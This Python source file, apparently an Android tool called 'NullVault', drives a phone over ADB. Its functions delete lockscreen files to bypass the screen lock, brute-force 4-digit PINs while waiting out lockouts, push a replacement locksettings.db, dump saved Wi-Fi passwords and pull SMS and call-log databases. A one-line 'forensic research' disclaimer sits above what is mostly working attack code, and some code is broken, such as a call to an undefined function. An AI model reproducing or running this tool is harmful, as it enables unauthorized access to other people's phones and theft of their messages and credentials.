import importlib.util
import subprocess
import sys
import time
import random
import os
import shutil
from colorama import init, Fore
import xml.etree.ElementTree as ET
from fpdf import FPDF
from datetime import datetime
from tqdm import tqdm

# Initialize colorama
init(autoreset=True)

REQUIRED_LIBS = ["colorama", "fpdf", "tqdm"]
LAST_PIN_FILE = "last_pin.txt"

# Function: Check required libraries
def check_libraries():
    print("[*] Checking required Python libraries...\n")
    missing = []
    for lib in REQUIRED_LIBS:
        if importlib.util.find_spec(lib):
            print(f"  ✅ {lib} is installed.")
        else:
            print(f"  ❌ {lib.capitalize()} is missing.")
            missing.append(lib)

    if missing:
        input("\nPress [ENTER] to install missing libraries...")
        for pkg in missing:
            print(f"[*] Installing {pkg}...")
            subprocess.call([sys.executable, "-m", "pip", "install", pkg])
        print("\n[+] All required libraries are now installed.\n")
    else:
        print("\n[+] All required libraries are installed.\n")

# Function: Print Banner
def print_banner():
    banner = r"""
 _______        .__  .______   ____            .__   __   
 \      \  __ __|  | |  \   \ /   /____   __ __|  |_/  |_ 
 /   |   \|  |  \  | |  |\   Y   /\__  \ |  |  \  |\   __\
/    |    \  |  /  |_|  |_\     /  / __ \|  |  /  |_|  |  
\____|__  /____/|____/____/\___/  (____  /____/|____/__|  
        \/                             \/                 
"""
    for line in banner.splitlines():
        print(random.choice([Fore.MAGENTA, Fore.CYAN]) + line)
    print(Fore.RED + "\n         Made with ❤️ by BEAST\n")
    print(Fore.YELLOW + "\n[!] This tool is intended for digital forensic research and educational use only. Unauthorized use.\n")

# Function: Wait for ADB device and return serial number
def wait_for_device():
    print("[*] Waiting for device connection...")
    while True:
        result = subprocess.getoutput("adb devices")
        lines = result.split("\n")
        if len(lines) > 1 and "device" in lines[1]:
            serial = lines[1].split("\t")[0]
            print(f"[+] Device connected (Serial: {serial}).")
            return serial
        print("[-] No device detected. Please connect your Android device...")
        time.sleep(3)

# Function: Create PDF report
def generate_pdf_report(info):
    device_name = info["Device Name"].replace("/", "_").capitalize()
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"NullVault_{device_name}_{timestamp}.pdf"

    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", 'B', 16)
    pdf.cell(0, 10, "NullVault by BEAST", ln=True, align='C')
    pdf.set_font("Arial", '', 12)
    pdf.ln(10)

    for k, v in info.items():
        pdf.cell(0, 10, f"{k}: {v}", ln=True)

    pdf.output(filename)
    print(f"[+] PDF report saved as: {filename}\n")

# Function: Get device info
def get_device_info():
    print("[*] Fetching device information...")
    props = {
        "Device Name": "ro.product.device",
        "Model": "ro.product.model",
        "Manufacturer": "ro.product.manufacturer",
        "Android Version": "ro.build.version.release",
        "Build ID": "ro.build.display.id",
        "Build Fingerprint": "ro.build.fingerprint"
    }
    info = {}
    for label, prop in props.items():
        result = subprocess.getoutput(f"adb shell getprop {prop}")
        info[label] = result.strip()

    print("\n=== Device Info ===")
    for key, val in info.items():
        print(f"{key}: {val}")
    print("===================\n")
    generate_pdf_report(info)
    return info["Android Version"], info

# Function: Ensure root access
def ensure_root():
    print("[*] Attempting ADB root...")
    result = subprocess.getoutput("adb root")
    time.sleep(2)
    if "cannot run as root" in result.lower():
        print("[-] adb root failed.")
        print("[*] Trying fallback using Magisk 'su' method...")
        test = subprocess.getoutput("adb shell su -c id")
        if "uid=0" in test:
            print("[+] Root access granted via 'su'.")
        else:
            print("[!] Root access failed. Make sure device is rooted and Magisk grants shell access.")
            return False
    else:
        print("[+] ADB root successful.")
    return True

# Function: Detect lock file
def detect_lock_file(android_version):
    major_version = int(android_version.split('.')[0])
    print("[*] Detecting lockscreen file...")
    if major_version < 9:
        out = subprocess.getoutput("adb shell ls /data/system/gesture.key")
        if "No such file" not in out:
            print("[+] gesture.key detected.")
            return "gesture.key"
    else:
        out = subprocess.getoutput("adb shell ls /data/system/locksettings.db")
        if "No such file" not in out:
            print("[+] locksettings.db detected.")
            return "locksettings.db"
    print("[!] No lockscreen file detected. Exiting.")
    sys.exit(1)

# Function: Delete lockscreen files
def delete_lock_files(lock_file):
    print(f"\n[!] You are about to DELETE {lock_file} and related lockscreen files.")
    print("Press [0] to DELETE and REMOVE lockscreen.")
    print("Press [1] to ABORT the process.")
    choice = input("Your choice: ").strip()

    if choice != '0':
        print("[-] Aborted by user.")
        return

    print("[*] Deleting lockscreen files...")

    delete_cmds = [
        "adb shell su -c 'rm /data/system/gesture.key'",
        "adb shell su -c 'rm /data/system/password.key'",
        "adb shell su -c 'rm /data/system/locksettings.db'",
        "adb shell su -c 'rm /data/system/locksettings.db-shm'",
        "adb shell su -c 'rm /data/system/locksettings.db-wal'",
        "adb shell su -c 'rm /data/system/gatekeeper.*'"
    ]

    for cmd in delete_cmds:
        subprocess.call(cmd, shell=True)

    print(Fore.GREEN + "\n🎉 Voila! The screen lock has been removed successfully.")
    print("[*] Rebooting device...")
    subprocess.call("adb reboot", shell=True)

# Function: Import locksettings.db
def import_locksettings_db(android_version):
    if not ensure_root():
        print(Fore.RED + "[!] Root access required.")
        return

    # Detect lockscreen file
    lock_file = detect_lock_file(android_version)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

    if lock_file:
        print(f"[*] Attempting to pull {lock_file} from device...")
        local_file = f"lockscreen_{timestamp}.{lock_file.split('.')[-1]}"
        try:
            # Copy to accessible path
            tmp_path = f"/sdcard/{lock_file}"
            subprocess.run(f"adb shell su -c 'cp /data/system/{lock_file} {tmp_path}'", shell=True, stdout=subprocess.DEVNULL)
            # Pull to local system
            subprocess.run(f"adb pull {tmp_path} {local_file}", shell=True, stdout=subprocess.DEVNULL)
            print(Fore.GREEN + f"[+] Pulled {lock_file} to {local_file}")
        except Exception as e:
            print(Fore.YELLOW + f"[!] Failed to pull {lock_file}: {e}")
            lock_file = None  # Fallback to manual input

    # If no file pulled, prompt for manual input
    if not lock_file:
        print("[*] No lockscreen file detected or pull failed.")
        filepath = input("Enter the full path to your lockscreen file (e.g., locksettings.db or gesture.key): ").strip()
        if not os.path.exists(filepath):
            print(Fore.RED + "[!] File not found. Aborting.")
            return
        local_file = filepath

    # Push file to device
    print(f"[*] Attempting to push {local_file} to device...")
    try:
        cmds = [
            f"adb push {local_file} /sdcard/locksettings.db",
            "adb shell su -c 'mv /sdcard/locksettings.db /data/system/locksettings.db'",
            "adb shell su -c 'chmod 600 /data/system/locksettings.db'"
        ]
        for cmd in cmds:
            subprocess.call(cmd, shell=True)
        print(Fore.GREEN + "\n[+] locksettings.db successfully pushed to the device!")
    except Exception as e:
        print(Fore.RED + f"[!] Failed to push file to device: {e}")

 # Function: Wi-Fi password extraction (Root required)
def extract_wifi_passwords():
    ensure_root()
    print("[*] Attempting to extract Wi-Fi passwords...")
    paths = [
        "/data/misc/wifi/WifiConfigStore.xml",
        "/data/misc/apexdata/com.android.wifi/WifiConfigStore.xml"
    ]

    local_file = "WifiConfigStore.xml"
    for path in paths:
        result = subprocess.getoutput(f"adb shell su -c 'ls {path}'")
        if "No such file" not in result:
            print(Fore.GREEN + f"[+] Found Wi-Fi config at: {path}")
            subprocess.call(f"adb shell su -c 'cp {path} /sdcard/'", shell=True)
            subprocess.call(f"adb pull /sdcard/{os.path.basename(path)} {local_file}", shell=True)
            break
    else:
        print(Fore.RED + "[-] No known Wi-Fi config files found.")
        return

    try:
        tree = ET.parse(local_file)
        root = tree.getroot()
        print(Fore.CYAN + "\n--- Saved Wi-Fi Credentials ---\n")
        for net in root.findall(".//Network"):
            ssid = net.find(".//string[@name='SSID']")
            psk = net.find(".//string[@name='PreSharedKey']")
            if ssid is not None:
                ssid_val = ssid.text.replace('"', '"') if ssid.text else "Unknown SSID"
                psk_val = psk.text if (psk is not None and psk.text) else "(Open/No Password)"
                print(f"SSID: {ssid_val} | PSK: {psk_val}")
    except Exception as e:
        print(Fore.RED + f"[!] Failed to parse Wi-Fi config: {e}")

# Function: SMS & Call Log extraction (Root required)
def extract_sms_and_call_logs():
    ensure_root()
    print("[*] Attempting to extract SMS and Call Logs...")

    sms_paths = ["/data/data/com.android.providers.telephony/databases/mmssms.db"]
    calllog_paths = ["/data/data/com.android.providers.contacts/databases/calllog.db"]

    for sms_path in sms_paths:
        if "No such file" not in subprocess.getoutput(f"adb shell su -c 'ls {sms_path}'"):
            subprocess.call(f"adb shell su -c 'cp {sms_path} /sdcard/'", shell=True)
            subprocess.call("adb pull /sdcard/mmssms.db", shell=True)
            print(Fore.GREEN + "[+] SMS database extracted.")
            break
    else:
        print(Fore.RED + "[-] SMS database not found.")

    for calllog_path in calllog_paths:
        if "No such file" not in subprocess.getoutput(f"adb shell su -c 'ls {calllog_path}'"):
            subprocess.call(f"adb shell su -c 'cp {calllog_path} /sdcard/'", shell=True)
            subprocess.call("adb pull /sdcard/calllog.db", shell=True)
            print(Fore.GREEN + "[+] Call Log database extracted.")
            break
    else:
        print(Fore.RED + "[-] Call Log database not found.")

# Function: Brute-force PIN helper functions
def send_keyevent(key):
    subprocess.run(["adb", "shell", "input", "keyevent", str(key)])

def wake_and_unlock():
    send_keyevent(26)  # Power button
    time.sleep(0.5)
    send_keyevent(82)  # Menu/Unlock
    time.sleep(0.5)

def swipe_up():
    subprocess.run(["adb", "shell", "input", "swipe", "407", "1211", "378", "85"])

def is_device_locked_out():
    output = subprocess.getoutput("adb shell dumpsys window windows | grep -i 'mCurrentFocus'")
    return any(x in output.lower() for x in ["keyguarderror", "lockout", "lockconfirm", "keyguardpassword"])

def is_device_unlocked():
    result = subprocess.getoutput("adb shell dumpsys window | grep mCurrentFocus")
    return "com.android.launcher" in result.lower() or "launcher" in result.lower()

# Function: Brute-force 4-digit PIN
def bruteforce_4digit():
    print("\n[!] Bruteforce mode selected (4-digit PIN, No Root).")
    print("[*] Starting ADB-based brute force attempt...")
    wake_and_unlock()

    if os.path.exists(LAST_PIN_FILE):
        with open(LAST_PIN_FILE, "r") as f:
            i = int(f.read().strip())
        print(Fore.YELLOW + f"[+] Resuming from last attempt: {i:04d}")
    else:
        i = 0

    while i < 10000:
        for _ in range(2):
            if i >= 10000:
                break
            pin = f"{i:04d}"
            print(f"Trying PIN: {pin}")
            for digit in pin:
                send_keyevent(int(digit) + 7)  # Key events 7-16 map to digits 0-9
            send_keyevent(66)  # Enter
            time.sleep(1.2)

            if is_device_unlocked():
                print(Fore.GREEN + f"\n[+] Success! Device unlocked with PIN: {pin}")
                if os.path.exists(LAST_PIN_FILE):
                    os.remove(LAST_PIN_FILE)  # Clean up last_pin.txt
                return

            if is_device_locked_out():
                print(Fore.YELLOW + f"[!] Lockout detected. Waiting 30 seconds before resuming from {pin}...")
                time.sleep(30)
                wake_and_unlock()
                swipe_up()
                continue

            i += 1
            with open(LAST_PIN_FILE, "w") as f:
                f.write(str(i))

        send_keyevent(26)  # Turn screen off
        time.sleep(6)
        wake_and_unlock()
        swipe_up()

    print(Fore.RED + "\n[-] Bruteforce attempt completed. PIN not found.")
    if os.path.exists(LAST_PIN_FILE):
        os.remove(LAST_PIN_FILE)  # Clean up last_pin.txt

# Function: Check path existence using ls
def path_exists(path):
    cmd = f"adb shell ls {path}"
    result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    with open("path_check_log.txt", "a") as log:
        log.write(f"Path check: {cmd}, stdout={result.stdout}, stderr={result.stderr}, returncode={result.returncode}\n")
    return result.returncode == 0

# Function: Check path existence using ls
def path_exists(path):
    cmd = f"adb shell ls {path}"
    result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    with open("path_check_log.txt", "a") as log:
        log.write(f"Path check: {cmd}, stdout={result.stdout}, stderr={result.stderr}, returncode={result.returncode}\n")
    return result.returncode == 0

# Function: File System Snapshot (Offline Analysis Mode)
def snapshot_file_system():
    print("[*] Creating file system snapshot for offline analysis...")

    if not ensure_root():
        print(Fore.RED + "[!] Root access required for snapshot.")
        return

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    snapshot_dir = f"snapshot_{timestamp}"
    os.makedirs(snapshot_dir, exist_ok=True)

    files_to_capture = [
        "/system/build.prop",
        "/vendor/build.prop",
        "/default.prop",
        "/system/etc/hosts",
        "/system/etc/resolv.conf",
        "/data/system/packages.xml",
        "/data/system/users/0/settings_global.xml",
        "/data/system/users/0/settings_secure.xml",
        "/data/system/users/0/settings_system.xml",
    ]

    for filepath in files_to_capture:
        filename = filepath.replace("/", "_")[1:]
        print(f"[*] Pulling {filepath}...")
        try:
            # Use adb shell + su to copy to accessible path
            tmp_path = f"/sdcard/{filename}"
            subprocess.run(f"adb shell su -c 'cp {filepath} {tmp_path}'", shell=True, stdout=subprocess.DEVNULL)
            subprocess.run(f"adb pull {tmp_path} {os.path.join(snapshot_dir, filename)}", shell=True, stdout=subprocess.DEVNULL)
        except Exception as e:
            print(Fore.YELLOW + f"[!] Failed to snapshot {filepath}: {e}")

    print(Fore.GREEN + f"\n[+] Snapshot completed and saved in: {snapshot_dir}\n")

# Main Menu Loop
def main():
    check_libraries()
    print_banner()
    wait_for_device()

    while True:
        android_version, info = get_device_info()

        print("Select an option:")
        print("  0. Bypass LockScreen (Root)")
        print("  1. Bruteforce PIN (No Root)")
        print("  2. Import locksettings.db to device (Root)")
        print("  3. Extract Wi-Fi Passwords (Root)")
        print("  4. Extract SMS / Call Logs (Root)")
        print("  5. File System Snapshot (Root)")
        print("  9. Exit")

        choice = input("Enter choice [0-5/9]: ").strip()

        if choice == '0':
            input("Press [ENTER] to begin lockscreen removal process...")
            ensure_root()
            lock_file = detect_lock_file(android_version)
            if lock_file:
                delete_lock(lock_file)
            else:
                print(Fore.RED + "[!] Cannot proceed without a detected lockscreen file.")
        elif choice == '1':
            bruteforce_4digit()
        elif choice == '2':
            import_locksettings_db(android_version)
        elif choice == '3':
            extract_wifi_passwords()
        elif choice == '4':
            extract_sms_and_call_logs()
        elif choice == '5':
            snapshot_file_system()
        elif choice == '9':
            print("[*] Exiting tool.")
            input("Press Enter to exit...")
            break
        else:
            print("[-] Invalid choice.")

if __name__ == "__main__":
    main()